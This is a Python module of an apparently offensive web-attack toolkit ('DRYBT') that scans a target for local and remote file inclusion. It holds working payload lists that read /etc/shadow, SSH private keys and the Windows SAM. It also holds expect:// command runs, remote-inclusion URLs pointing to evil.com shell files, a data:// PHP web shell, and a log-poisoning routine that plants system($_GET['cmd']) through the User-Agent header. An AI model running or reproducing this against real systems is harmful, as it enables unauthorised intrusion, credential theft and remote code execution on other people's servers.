#!/usr/bin/env python3
"""
Module 9: LFI/RFI Scanner
9 Layer file inclusion detection dengan zero false positive
Mendeteksi: Local File Inclusion (LFI), Remote File Inclusion (RFI),
Null byte injection, WAF bypass, Log poisoning, Session poisoning
"""

import asyncio
import re
import time
import hashlib
import random
import base64
from typing import List, Dict, Optional, Tuple, Set
from urllib.parse import quote, unquote
from core.http_client import HTTPClient
from core.logger import Logger

logger = Logger()

class LFI_RFI_Scanner:
    def __init__(self, target: str, threads: int = 40, timeout: int = 8):
        self.target = target.rstrip('/')
        self.threads = threads
        self.timeout = timeout
        self.findings: List[Dict] = []
        self.stats = {
            'endpoints_tested': 0,
            'payloads_tested': 0,
            'vulnerabilities_found': 0
        }
        
        # ============ LFI/RFI VULNERABLE PARAMETERS ============
        self.file_params = [
            # File parameters
            'file', 'files', 'document', 'doc', 'pdf', 'image', 'img',
            'filename', 'filepath', 'path', 'dir', 'folder', 'directory',
            
            # Include parameters
            'include', 'include_file', 'require', 'require_once', 'include_once',
            'page', 'pages', 'template', 'theme', 'layout', 'view',
            
            # Language parameters
            'lang', 'language', 'locale', 'translation', 'i18n',
            
            # Content parameters
            'content', 'article', 'post', 'news', 'blog', 'story',
            
            # Download parameters
            'download', 'attachment', 'get_file', 'read', 'open', 'show',
            
            # Config parameters
            'config', 'conf', 'setting', 'option', 'ini', 'cfg',
            
            # PHP specific
            'php', 'module', 'mod', 'class', 'controller', 'action'
        ]
        
        # ============ LFI PAYLOADS - MULTI PLATFORM ============
        
        # Level 1: Basic Path Traversal
        self.path_traversal_payloads = {
            'linux': [
                '../../../../etc/passwd',
                '../../../etc/passwd',
                '../../etc/passwd',
                '../etc/passwd',
                '../../../../etc/passwd',
                '../../../../../etc/passwd',
                '../../../../../../etc/passwd',
                '../../../../../../../etc/passwd',
                '/etc/passwd',
                'etc/passwd',
                '....//....//....//etc/passwd',
                '..;/..;/..;/etc/passwd',
                '../../../../etc/passwd%00',
                '../../../../etc/passwd%00.jpg',
            ],
            'windows': [
                '../../../../Windows/win.ini',
                '../../../Windows/win.ini',
                '../../Windows/win.ini',
                '../Windows/win.ini',
                'C:\\Windows\\win.ini',
                'C:/Windows/win.ini',
                'Windows/win.ini',
                '../../../../Windows/System32/drivers/etc/hosts',
                '../../../../boot.ini',
                '../../../../autoexec.bat',
                '....//....//....//Windows/win.ini',
                '../../../../Windows/win.ini%00',
                '../../../../Windows/win.ini%00.jpg',
            ]
        }
        
        # Level 2: Sensitive Files (Linux)
        self.linux_sensitive_files = [
            # System files
            '/etc/passwd',
            '/etc/shadow',
            '/etc/group',
            '/etc/hosts',
            '/etc/hostname',
            '/etc/issue',
            '/etc/os-release',
            '/etc/fstab',
            '/etc/mtab',
            '/etc/crontab',
            '/etc/ssh/sshd_config',
            '/etc/ssh/ssh_config',
            '/etc/my.cnf',
            '/etc/mysql/my.cnf',
            '/etc/php.ini',
            '/etc/php.ini.default',
            '/etc/httpd/conf/httpd.conf',
            '/etc/apache2/apache2.conf',
            '/etc/nginx/nginx.conf',
            
            # System logs
            '/var/log/auth.log',
            '/var/log/syslog',
            '/var/log/apache2/access.log',
            '/var/log/apache2/error.log',
            '/var/log/nginx/access.log',
            '/var/log/nginx/error.log',
            '/var/log/mysql/error.log',
            
            # User files
            '/home/user/.bashrc',
            '/home/user/.bash_history',
            '/home/user/.ssh/id_rsa',
            '/home/user/.ssh/authorized_keys',
            '/root/.bashrc',
            '/root/.bash_history',
            '/root/.ssh/id_rsa',
            '/root/.ssh/authorized_keys',
            
            # Application files
            '/var/www/html/config.php',
            '/var/www/html/.env',
            '/var/www/html/wp-config.php',
            '/var/www/html/configuration.php',
            '/app/config/database.yml',
            '/config/database.php',
            
            # Proc files
            '/proc/self/environ',
            '/proc/self/cmdline',
            '/proc/version',
            '/proc/mounts',
            '/proc/cpuinfo',
            '/proc/meminfo',
            '/proc/self/fd/0',
            '/proc/self/fd/1',
            '/proc/self/fd/2',
            
            # Other
            '/dev/null',
            '/dev/random',
            '/dev/urandom'
        ]
        
        # Level 3: Sensitive Files (Windows)
        self.windows_sensitive_files = [
            # System files
            'C:\\Windows\\win.ini',
            'C:\\Windows\\system.ini',
            'C:\\Windows\\System32\\drivers\\etc\\hosts',
            'C:\\Windows\\System32\\drivers\\etc\\networks',
            'C:\\Windows\\System32\\config\\SAM',
            'C:\\Windows\\System32\\config\\SYSTEM',
            'C:\\Windows\\System32\\config\\SECURITY',
            'C:\\Windows\\Debug\\NetSetup.log',
            'C:\\Windows\\repair\\sam',
            'C:\\Windows\\repair\\system',
            'C:\\Windows\\repair\\security',
            
            # Boot files
            'C:\\boot.ini',
            'C:\\autoexec.bat',
            'C:\\config.sys',
            
            # Application files
            'C:\\Program Files\\Apache Group\\Apache\\conf\\httpd.conf',
            'C:\\xampp\\apache\\conf\\httpd.conf',
            'C:\\wamp\\bin\\apache\\apache2.4.9\\conf\\httpd.conf',
            'C:\\inetpub\\wwwroot\\web.config',
            'C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319\\Config\\web.config',
            'C:\\xampp\\htdocs\\wp-config.php',
            
            # Log files
            'C:\\Windows\\System32\\LogFiles\\W3SVC1\\*.log',
            'C:\\Windows\\System32\\LogFiles\\HTTPERR\\httperr.log',
            'C:\\inetpub\\logs\\LogFiles\\W3SVC1\\u_ex*.log'
        ]
        
        # Level 4: PHP Wrapper Payloads
        self.php_wrapper_payloads = [
            # PHP filter (read PHP source code)
            'php://filter/convert.base64-encode/resource=index.php',
            'php://filter/convert.base64-encode/resource=config.php',
            'php://filter/convert.base64-encode/resource=wp-config.php',
            'php://filter/read=convert.base64-encode/resource=../config.php',
            'php://filter/convert.base64-encode/resource=../../../../etc/passwd',
            'php://filter/zlib.deflate/convert.base64-encode/resource=config.php',
            'php://filter/string.rot13/resource=config.php',
            'php://filter/string.toupper/resource=config.php',
            
            # PHP input (executing code)
            'php://input',
            'php://stdin',
            
            # PHP memory
            'php://memory',
            'php://temp',
            
            # PHP expect (if enabled)
            'expect://id',
            'expect://ls -la',
            'expect://whoami',
            'expect://cat /etc/passwd',
        ]
        
        # Level 5: RFI Payloads (Remote File Inclusion)
        self.rfi_payloads = [
            # Basic RFI
            'http://evil.com/shell.txt',
            'https://evil.com/shell.txt',
            'http://localhost/shell.txt',
            'http://169.254.169.254/shell.txt',
            'http://127.0.0.1/shell.txt',
            
            # With parameters
            'http://evil.com/shell.txt?',
            'http://evil.com/shell.txt%00',
            'http://evil.com/shell.php?id=1',
            
            # Remote configs
            'http://raw.githubusercontent.com/shell.php',
            'https://pastebin.com/raw/shell.php',
            
            # Data wrapper (PHP)
            'data://text/plain,<?php system($_GET["cmd"]); ?>',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+',
            'data:text/plain,<?php echo shell_exec($_GET["cmd"]); ?>',
            
            # Expect wrapper
            'expect://ls',
            'expect://id',
        ]
        
        # Level 6: Encoding Bypass Payloads
        self.encoding_payloads = [
            # URL encoding
            '%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd',
            '%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd',
            '%2e%2e/%2e%2e/%2e%2e/etc/passwd',
            
            # Double encoding
            '%252e%252e%252fetc%252fpasswd',
            '%2525252e%2525252e%2525252fetc%2525252fpasswd',
            
            # Unicode encoding
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            '%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/passwd',
            
            # UTF-16 encoding
            '..%c0%af..%c0%af..%c0%afetc%c0%afpasswd',
            
            # Base64 encoding
            base64.b64encode(b'../../../../etc/passwd').decode(),
            base64.b64encode(b'../../../../Windows/win.ini').decode(),
        ]
        
        # Level 7: Null Byte Injection (Depends on PHP version)
        self.null_byte_payloads = [
            '../../../../etc/passwd%00',
            '../../../../etc/passwd%00.jpg',
            '../../../../etc/passwd%00.png',
            '../../../../etc/passwd%00.gif',
            '../../../etc/passwd%00',
            '../../Windows/win.ini%00',
            '../../Windows/win.ini%00.jpg',
            'php://filter/convert.base64-encode/resource=config.php%00',
            'http://evil.com/shell.txt%00',
        ]
        
        # Level 8: Log Poisoning Payloads
        self.log_poisoning_payloads = [
            # Apache/Nginx logs
            '../../../../var/log/apache2/access.log',
            '../../../../var/log/apache2/error.log',
            '../../../../var/log/nginx/access.log',
            '../../../../var/log/nginx/error.log',
            '../../../var/log/httpd/access_log',
            '../../../var/log/httpd/error_log',
            
            # SSH logs
            '../../../../var/log/auth.log',
            '../../../../var/log/secure',
            
            # Session files
            '../../../../var/lib/php/sess_',
            '../../../../tmp/sess_',
            '../../../var/lib/php5/sess_',
            '../../../tmp/sess_',
            
            # Mail logs
            '../../../../var/log/mail.log',
            '../../../var/log/mail.log',
            
            # Database logs
            '../../../../var/log/mysql/error.log',
            '../../../var/log/mysql/mysql.log',
        ]
        
        # Level 9: Session Poisoning
        self.session_payloads = [
            '../../../../tmp/sess_',
            '../../../../var/lib/php/sessions/sess_',
            '../../../../var/lib/php5/sess_',
            '../../../var/lib/php/sessions/sess_',
            '../../../../app/sessions/sess_',
            '../../../tmp/sessions/sess_',
        ]
        
        # Indicators of successful file inclusion
        self.success_indicators = {
            'linux_root': ['root:', 'root:x:', 'daemon:', 'bin:', 'sys:', 'nobody:', '/bin/bash', '/bin/sh'],
            'linux_users': [':/home/', ':/root:', ':/var/www', ':/usr/bin'],
            'windows': ['[extensions]', '[fonts]', '[mail]', 'Microsoft', 'Windows', 'Program Files'],
            'php_source': ['PD9waHA', '<?php', '?>', 'function', 'define(', 'require_once'],
            'config': ['DB_HOST', 'DB_USER', 'DB_PASSWORD', 'database', 'username', 'password'],
            'log': ['GET /', 'POST /', 'HTTP/', '404', '200', 'error'],
            'ssh_key': ['BEGIN RSA PRIVATE KEY', 'BEGIN OPENSSH PRIVATE KEY', 'ssh-rsa'],
            'db': ['TABLE', 'CREATE TABLE', 'INSERT INTO', 'SELECT * FROM'],
        }
        
        # RFI success indicators
        self.rfi_indicators = [
            '<?php', 'system(', 'eval(', 'shell_exec', 'exec(', 'passthru',
            'cmd', 'whoami', 'id', 'echo', 'print'
        ]
    
    async def test_lfi_payload(self, endpoint: str, param: str, payload: str, platform: str = "linux") -> Optional[Dict]:
        """Test LFI payload"""
        
        # URL encode the payload
        encoded_payload = quote(payload, safe='')
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url = f"{endpoint}?{param}={encoded_payload}"
            response = await client.get(url)
            
            if response:
                body = await response.text()
                
                # Check for successful file inclusion
                for category, indicators in self.success_indicators.items():
                    for indicator in indicators:
                        if indicator.lower() in body.lower():
                            # Verify it's not a false positive (error page)
                            if self._is_valid_file_content(body, indicator):
                                severity = "critical" if category in ['linux_root', 'windows'] else "high"
                                
                                return {
                                    "vulnerable": True,
                                    "type": "LFI",
                                    "severity": severity,
                                    "confidence": 95,
                                    "endpoint": endpoint,
                                    "parameter": param,
                                    "payload": payload,
                                    "platform": platform,
                                    "indicator_category": category,
                                    "indicator_found": indicator,
                                    "response_snippet": body[min(body.find(indicator.lower())-100, 0):body.find(indicator.lower())+300] if indicator.lower() in body else body[:500]
                                }
        
        return None
    
    def _is_valid_file_content(self, body: str, indicator: str) -> bool:
        """Check if response contains actual file content, not error message"""
        
        # False positive patterns
        false_positives = [
            'file not found', 'no such file', 'failed to open',
            'access denied', 'permission denied', 'invalid file',
            'error', 'warning', 'notice'
        ]
        
        for fp in false_positives:
            if fp in body.lower():
                return False
        
        # Check if indicator appears in context of file content
        idx = body.lower().find(indicator.lower())
        if idx > 0:
            # Check surrounding text for file structure
            surrounding = body[max(0, idx-200):min(len(body), idx+400)]
            
            # Linux passwd structure
            if ':' in surrounding and ('/bin/' in surrounding or '/sbin/' in surrounding):
                return True
            
            # Windows INI structure
            if '[extensions]' in surrounding or '[fonts]' in surrounding:
                return True
            
            # File has reasonable length
            if len(body) > 100 and len(body) < 500000:
                return True
        
        return False
    
    async def test_rfi_payload(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test RFI payload"""
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url = f"{endpoint}?{param}={quote(payload, safe='')}"
            response = await client.get(url)
            
            if response:
                body = await response.text()
                
                # Check for RFI indicators (included remote code)
                for indicator in self.rfi_indicators:
                    if indicator.lower() in body.lower():
                        return {
                            "vulnerable": True,
                            "type": "RFI",
                            "severity": "critical",
                            "confidence": 90,
                            "endpoint": endpoint,
                            "parameter": param,
                            "payload": payload,
                            "indicator_found": indicator,
                            "response_snippet": body[:500]
                        }
        
        return None
    
    async def test_php_wrapper(self, endpoint: str, param: str, payload: str) -> Optional[Dict]:
        """Test PHP wrapper for reading source code"""
        
        async with HTTPClient(self.target, timeout=self.timeout, retries=1) as client:
            url = f"{endpoint}?{param}={quote(payload, safe='')}"
            response = await client.get(url)
            
            if response:
                body = await response.text()
                
                # Check for base64 encoded PHP source
                base64_pattern = r'^[A-Za-z0-9+/]+={0,2}$'
                
                # If response is base64-like
                if len(body) > 50 and re.match(base64_pattern, body[:100]):
                    try:
                        decoded = base64.b64decode(body)
                        if b'<?php' in decoded or b'function' in decoded or b'class' in decoded:
                            return {
                                "vulnerable": True,
                                "type": "PHP_WRAPPER_LFI",
                                "severity": "critical",
                                "confidence": 100,
                                "endpoint": endpoint,
                                "parameter": param,
                                "payload": payload,
                                "base64_encoded": True,
                                "response_snippet": decoded[:500] if decoded else body[:500]
                            }
                    except:
                        pass
                
                # Check for direct PHP code
                if '<?php' in body and 'function' in body:
                    return {
                        "vulnerable": True,
                        "type": "PHP_WRAPPER_LFI",
                        "severity": "critical",
                        "confidence": 100,
                        "endpoint": endpoint,
                        "parameter": param,
                        "payload": payload,
                        "php_source": True,
                        "response_snippet": body[:500]
                    }
        
        return None
    
    async def test_log_poisoning(self, endpoint: str, param: str, log_path: str) -> Optional[Dict]:
        """Test log poisoning via User-Agent injection"""
        
        # First, inject PHP code into logs via User-Agent
        php_code = "<?php system($_GET['cmd']); ?>"
        
        async with HTTPClient(self.target, timeout=self.timeout) as client:
            # Inject malicious User-Agent
            headers = {"User-Agent": php_code}
            await client.get("/", headers=headers)
        
        await asyncio.sleep(1)
        
        # Then try to include the poisoned log
        result = await self.test_lfi_payload(endpoint, param, log_path, "linux")
        
        if result:
            result["type"] = "LOG_POISONING_LFI"
            result["details"] = "Successfully poisoned logs and included them"
            return result
        
        return None
    
    async def scan_endpoint(self, endpoint: str, param: str) -> List[Dict]:
        """Scan single endpoint parameter for LFI/RFI"""
        
        findings = []
        
        # Layer 1: Basic Linux LFI
        for payload in self.path_traversal_payloads['linux'][:10]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"💎 LFI on {endpoint} via {param}", f"Payload: {payload}")
                return findings
        
        # Layer 2: Basic Windows LFI
        for payload in self.path_traversal_payloads['windows'][:10]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "windows")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"💎 LFI on {endpoint} via {param}", f"Payload: {payload}")
                return findings
        
        # Layer 3: Linux Sensitive Files
        for payload in self.linux_sensitive_files[:20]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"🔴 LFI on {endpoint} via {param}", f"File: {payload}")
                return findings
        
        # Layer 4: PHP Wrappers (Critical)
        for payload in self.php_wrapper_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_php_wrapper(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"💎 PHP Wrapper LFI on {endpoint} via {param}", f"Wrapper: {payload}")
                return findings
        
        # Layer 5: RFI (Remote File Inclusion)
        for payload in self.rfi_payloads:
            self.stats['payloads_tested'] += 1
            result = await self.test_rfi_payload(endpoint, param, payload)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"💎 RFI on {endpoint} via {param}", f"Remote URL: {payload}")
                return findings
        
        # Layer 6: Null Byte Injection
        for payload in self.null_byte_payloads[:10]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"🔴 Null Byte LFI on {endpoint} via {param}", f"Payload: {payload}")
                return findings
        
        # Layer 7: Encoding Bypass
        for payload in self.encoding_payloads[:10]:
            self.stats['payloads_tested'] += 1
            result = await self.test_lfi_payload(endpoint, param, payload, "linux")
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"🟠 Encoding Bypass LFI on {endpoint} via {param}", f"Payload: {payload[:50]}")
                return findings
        
        # Layer 8: Log Poisoning
        for log_path in self.log_poisoning_payloads[:5]:
            self.stats['payloads_tested'] += 1
            result = await self.test_log_poisoning(endpoint, param, log_path)
            if result:
                findings.append(result)
                self.stats['vulnerabilities_found'] += 1
                logger.finding(f"🔥 Log Poisoning LFI on {endpoint} via {param}", f"Log: {log_path}")
                return findings
        
        return findings
    
    async def scan(self, custom_endpoints: List[str] = None) -> Dict:
        """Full LFI/RFI scanner"""
        
        if custom_endpoints:
            endpoints = custom_endpoints
        else:
            endpoints = ["/", "/include", "/file", "/download", "/view", "/page", "/template"]
        
        total_params = len(self.file_params)
        
        logger.info(f"\n{'='*60}")
        logger.info(f"🚀 DRYBT LFI/RFI SCANNER")
        logger.info(f"{'='*60}")
        logger.info(f"🎯 Target: {self.target}")
        logger.info(f"📡 Endpoints: {len(endpoints)}")
        logger.info(f"📊 Parameters: {total_params}")
        logger.info(f"📈 Payload categories: 9 (Linux, Windows, PHP Wrappers, RFI, Null Byte, Encoding, Log Poisoning)")
        logger.info(f"🔧 Threads: {self.threads} | Timeout: {self.timeout}s")
        logger.info(f"{'='*60}\n")
        
        start_time = time.time()
        
        for endpoint in endpoints:
            logger.info(f"\n📡 Testing endpoint: {endpoint}")
            
            # Test each parameter
            for param in self.file_params[:20]:  # Limit for speed
                findings = await self.scan_endpoint(endpoint, param)
                self.findings.extend(findings)
                
                if findings:
                    logger.info(f"  ✅ Found LFI/RFI via parameter: {param}")
                
                await asyncio.sleep(0.05)
            
            self.stats['endpoints_tested'] += 1
        
        elapsed = time.time() - start_time
        
        # Categorize findings
        critical_findings = [f for f in self.findings if f.get('severity') == 'critical']
        high_findings = [f for f in self.findings if f.get('severity') == 'high']
        
        # Print summary
        print(f"\n{'='*60}")
        print(f"📊 LFI/RFI SCAN SUMMARY")
        print(f"{'='*60}")
        print(f"⏱️  Time: {elapsed:.2f} seconds")
        print(f"📡 Endpoints tested: {self.stats['endpoints_tested']}")
        print(f"📊 Payloads tested: {self.stats['payloads_tested']}")
        print(f"🎯 Vulnerabilities found: {len(self.findings)}")
        
        if critical_findings:
            print(f"\n💎 CRITICAL VULNERABILITIES:")
            for f in critical_findings:
                print(f"   🔥 {f['type']} | {f.get('parameter', 'unknown')} | Confidence: {f.get('confidence', 0)}%")
        
        if high_findings:
            print(f"\n🔴 HIGH VULNERABILITIES:")
            for f in high_findings:
                print(f"   ⚡ {f['type']} | {f.get('parameter', 'unknown')} | Confidence: {f.get('confidence', 0)}%")
        
        print(f"\n{'='*60}")
        
        rating = "🏆 CRITICAL - File system compromised!" if critical_findings else \
                 "⭐ HIGH - File inclusion confirmed" if high_findings else \
                 "✅ SECURE - No LFI/RFI detected"
        
        print(f"📈 Security Rating: {rating}")
        print(f"{'='*60}\n")
        
        return {
            "module": "lfi_rfi_scanner",
            "target": self.target,
            "scan_time_seconds": round(elapsed, 2),
            "endpoints_tested": self.stats['endpoints_tested'],
            "payloads_tested": self.stats['payloads_tested'],
            "vulnerabilities_found": len(self.findings),
            "critical_vulnerabilities": len(critical_findings),
            "high_vulnerabilities": len(high_findings),
            "security_rating": rating,
            "findings": self.findings
        }
    
    @staticmethod
    async def run(target: str, custom_endpoints: List[str] = None) -> Dict:
        """
        Run LFI/RFI scanner - DRYBT LFI/RFI SCANNER
        
        Args:
            target: Target URL
            custom_endpoints: Custom endpoints to test (optional)
        """
        scanner = LFI_RFI_Scanner(target)
        return await scanner.scan(custom_endpoints)